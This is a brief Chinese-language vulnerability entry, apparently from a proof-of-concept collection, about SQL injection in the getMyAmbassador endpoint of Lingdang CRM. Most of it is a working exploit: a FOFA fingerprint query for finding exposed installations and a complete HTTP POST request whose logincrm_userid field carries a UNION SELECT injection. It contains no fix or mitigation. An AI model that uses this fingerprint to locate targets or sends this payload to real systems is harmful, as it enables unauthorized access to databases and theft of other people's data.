# 灵当CRM系统接口getMyAmbassador存在SQL注入漏洞

灵当CRM系统接口getMyAmbassador存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
```

## poc

```javascript
POST /crm/WeiXinApp/marketing/index.php?module=Ambassador&action=getMyAmbassador HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Connection: close

logincrm_userid=-1 union select user(),2,3#
```

![image-20241227212430930](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272124007.png)